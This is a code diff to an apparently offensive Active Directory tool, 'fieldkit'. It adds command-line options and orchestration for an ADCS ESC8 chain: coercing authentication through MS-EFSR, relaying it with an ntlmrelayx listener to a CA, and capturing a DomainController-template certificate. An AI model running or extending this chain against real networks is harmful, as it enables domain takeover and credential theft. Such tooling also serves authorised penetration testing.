@@ -1658,14 +1658,31 @@ def cmd_chain_run(args, store):
         probe_timeout = args.probe_timeout
         listener_uri = args.listener
         cred = cred_dict
+        # D3 relay-listener config
+        listener_ip = args.listener_ip
+        ca_endpoint = args.ca
+        template = args.template
+        relay_port_smb = args.relay_port_smb
+        relay_port_http = args.relay_port_http
+        relay_wait_capture = args.relay_capture_timeout
+        # Store passed through so relay:capture can persist the cert
+        # against the chain id — see _persisted_id below.
+        store = None
+
+    _Ctx.store = store       # bind after class body so lint stays quiet
 
     def _render(chain, step, outcome):
         marker = {"ok": "  ok ", "manual": " man ", "skip": "skip ",
                   "fail": "FAIL "}[outcome.kind]
         print(f"  {marker} {step.name:30s}  {outcome.evidence}")
 
+    # Reserve chain_id BEFORE walk so a mid-walk relay:capture step
+    # can persist a cert row linked to this chain. Finalize after
+    # walk writes the step trail + final status.
+    chain_id = store.reserve_chain_id(ch)
+    ch._persisted_id = chain_id                  # noqa: SLF001 — walker reads this
     chain_mod.walk(ch, _Ctx(), on_step=_render)
-    chain_id = store.add_chain(ch)
+    store.finalize_chain(chain_id, ch)
     total_cost = ch.total_detection_cost
     print(f"\nchain #{chain_id}  status={ch.status}  detection cost so far = {total_cost}")
     if ch.aborted_reason:
@@ -2730,9 +2747,27 @@ the spec is missing that field. `--from-file` reads one credential per line.
                        help="reachability probe timeout in seconds (default: 3.0)")
     c_run.add_argument("--listener", metavar="SMB_URI",
                        help="SMB URI the coerce points at (e.g. "
-                            r"\\10.0.0.5\share). D3's listener will set this "
-                            "automatically; for now, either point at your "
-                            "own smbserver or omit to hand off manually.")
+                            r"\\10.0.0.5\share). Skip when passing "
+                            "--listener-ip + --ca — fieldkit builds the URI "
+                            "from the bound listener automatically.")
+    c_run.add_argument("--listener-ip", metavar="IP",
+                       help="fieldkit host IP the target can reach (for "
+                            "spawning the ntlmrelayx listener; D3+).")
+    c_run.add_argument("--ca", metavar="HOST",
+                       help="ADCS CA host for esc8's relay target (e.g. "
+                            "ca01.corp.local).")
+    c_run.add_argument("--template", metavar="NAME", default="DomainController",
+                       help="ADCS certificate template (default: "
+                            "DomainController; the esc8 canonical).")
+    c_run.add_argument("--relay-port-smb", type=int, default=445, metavar="PORT",
+                       help="SMB bind port for the relay listener "
+                            "(default 445 needs root; try 4445 as non-root).")
+    c_run.add_argument("--relay-port-http", type=int, default=80, metavar="PORT",
+                       help="HTTP bind port for the relay listener (default 80).")
+    c_run.add_argument("--relay-capture-timeout", type=float, default=60.0,
+                       metavar="S",
+                       help="how long to wait for the caught auth after the "
+                            "coerce fired (default 60s).")
     c_run.add_argument("--cred-id", type=int, metavar="ID",
                        help="credential id to use for auth to the target's "
                             "MS-EFSR endpoint (see `fieldkit list creds`); "
